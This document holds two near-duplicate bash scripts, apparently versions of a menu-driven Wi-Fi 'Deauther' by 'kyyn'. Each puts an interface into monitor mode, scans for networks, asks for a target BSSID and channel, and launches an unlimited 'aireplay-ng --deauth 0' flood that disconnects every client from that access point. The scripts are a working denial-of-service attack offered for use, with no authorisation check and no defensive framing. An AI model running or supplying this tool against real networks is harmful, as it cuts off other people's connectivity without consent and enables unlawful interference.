
#!/bin/bash
x="t"
menu ()
{
while true $x != "t"
do
clear
echo ""
echo ""
echo -e " \e[97m[\e[91mMSG\e[97m] \e[97mStarting...."
sleep .8
echo -e " \e[97m[\e[91mMSG\e[97m] \e[97mWelcome to aircrack-ng Deauther GUI by kyyn | version 1.2"
echo ""
echo -e "\e[97m     @@@@@@@   @@@@@@@@   @@@@@@   @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@   "
echo -e "\e[97m     @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@@  "
echo -e "\e[97m     @@!  @@@  @@!       @@!  @@@  @@!  @@@    @@!    @@!  @@@  @@!       @@!  @@@  "
echo -e "\e[97m     !@!  @!@  !@!       !@!  @!@  !@!  @!@    !@!    !@!  @!@  !@!       !@!  @!@  "
echo -e "\e[97m     @!@  !@!  @!!!:!    @!@!@!@!  @!@  !@!    @!!    @!@!@!@!  @!!!:!    @!@!!@!   "
echo -e "\e[97m     !@!  !!!  !!!!!:    !!!@!!!!  !@!  !!!    !!!    !!!@!!!!  !!!!!:    !!@!@!    "
echo -e "\e[97m     !!:  !!!  !!:       !!:  !!!  !!:  !!!    !!:    !!:  !!!  !!:       !!: :!!   "
echo -e "\e[97m     :!:  !:!  :!:       :!:  !:!  :!:  !:!    :!:    :!:  !:!  :!:       :!:  !:!  "
echo -e "\e[97m      :::: ::   :: ::::  ::   :::  ::::: ::     ::    ::   :::   :: ::::  ::   :::  "
echo -e "\e[97m     :: :  :   : :: ::    :   : :   : :  :      :      :   : :  : :: ::    :   : :  "
echo ""
echo ""
echo -e " \e[97m[\e[91m1\e[97m] \e[97mStart Attack"
echo ""
echo -e -n "\e[93mOption >\e[97m "
read x
echo -e "\e[97m"
clear

case "$x" in


    1)
      echo -e " + Insert an Interface to monitor(ex: wlan1): \e[39m"
      read interface
      sudo airmon-ng start $interface
      sudo airodump-ng $interface
      echo -e "\e[93m + Enter the BSSID target: \e[97m"
      read bssid
      echo -e "\e[93m + Enter the Channel target: \e[97m"
      read channel
      echo -e " \e[97m[\e[91mALERT\e[97m] \e[97m After dump press CTRL+C to start deauther!"
      echo -e " Press \e[92mENTER \e[97m to continue"
      read -p -n ""
      sudo airodump-ng --bssid $bssid --channel $channel $interface
      echo -e "\e[39m"
      echo -e "\e[101m STARTING DEAUTH | ($bssid) | ($channel)\e[97m\e[49m"
      sudo aireplay-ng --deauth 0 -a $bssid $interface
     echo ""
     echo -e "\e[102m ATTACK STOPPED!\e[97m\e[49m"

;;

*)
        echo "ERROR!"
esac
done

}
menu


#!/bin/bash
x="t"
menu ()
{
while true $x != "t"
do
clear
echo ""
echo ""
echo -e " \e[97m[\e[91m+\e[97m] \e[97mStarting...."
echo -e " \e[97m[\e[91m+\e[97m] \e[97mDeveloped by kyyn"
echo -e " \e[97m[\e[91m+\e[97m] \e[97mVersion 1.2"
echo ""
echo -e "\e[97m     @@@@@@@   @@@@@@@@   @@@@@@   @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@   "
echo -e "\e[97m     @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@@  "
echo -e "\e[97m     @@!  @@@  @@!       @@!  @@@  @@!  @@@    @@!    @@!  @@@  @@!       @@!  @@@  "
echo -e "\e[97m     !@!  @!@  !@!       !@!  @!@  !@!  @!@    !@!    !@!  @!@  !@!       !@!  @!@  "
echo -e "\e[97m     @!@  !@!  @!!!:!    @!@!@!@!  @!@  !@!    @!!    @!@!@!@!  @!!!:!    @!@!!@!   "
echo -e "\e[97m     !@!  !!!  !!!!!:    !!!@!!!!  !@!  !!!    !!!    !!!@!!!!  !!!!!:    !!@!@!    "
echo -e "\e[97m     !!:  !!!  !!:       !!:  !!!  !!:  !!!    !!:    !!:  !!!  !!:       !!: :!!   "
echo -e "\e[97m     :!:  !:!  :!:       :!:  !:!  :!:  !:!    :!:    :!:  !:!  :!:       :!:  !:!  "
echo -e "\e[97m      :::: ::   :: ::::  ::   :::  ::::: ::     ::    ::   :::   :: ::::  ::   :::  "
echo -e "\e[97m     :: :  :   : :: ::    :   : :   : :  :      :      :   : :  : :: ::    :   : :  "
echo ""
echo ""
echo -e " \e[97m[\e[91m1\e[97m] \e[97mStart Attack"
echo ""
echo -e -n "\e[93m>\e[97m "
read x
echo -e "\e[97m"
clear

case "$x" in


    1)
      echo -e " + Insert an Interface to monitor(ex: wlan1): \e[39m"
      read interface
      sudo airmon-ng start $interface
      sudo airodump-ng $interface
      echo -e "\e[93m + Enter the BSSID target: \e[97m"
      read bssid
      echo -e "\e[93m + Enter the Channel target: \e[97m"
      read channel
      sudo airodump-ng --bssid $bssid --channel $channel $interface
      echo -e "\e[39m"
      echo -e "\e[101m STARTING DEAUTH | ($bssid) | ($channel)\e[97m\e[49m"
      sudo aireplay-ng --deauth 0 -a $bssid $interface
     echo ""
     echo -e "\e[102m ATTACK STOPPED!\e[97m\e[49m"

;;

*)
        echo "ERROR!"
esac
done

}
menu



